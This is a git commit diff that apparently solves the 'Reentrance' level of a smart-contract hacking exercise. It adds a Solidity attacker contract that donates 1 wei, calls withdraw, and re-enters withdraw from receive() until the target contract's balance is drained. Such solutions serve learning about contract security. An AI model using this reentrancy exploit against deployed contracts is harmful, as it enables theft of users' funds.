3f83f9fe740a00b777d53e05921a5045a16d54ca
Rares Stanciu <rares.stanciu@outlook.com>
2022-05-04 23:32:15 +0300

    feat: solve Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -10,6 +10,19 @@ contract AttackingReentrance {
     }
 
     function hackContract() external {
-        // Code me!
+        // We first send at least 1 wei so that we can call `withdraw` afterwards
+        Reentrance(contractAddress).donate{value: 1}(address(this));
+
+        // We now call `withdraw`.
+        Reentrance(contractAddress).withdraw();
+    }
+
+    receive() external payable {
+        // In the `withdraw` call, Reentrance contract tries to send us our balance,
+        // receive() gets called, and we call back again the withdraw function, if there
+        // is any balance left.
+        if (address(contractAddress).balance > 0) {
+            Reentrance(contractAddress).withdraw();
+        }
     }
 }
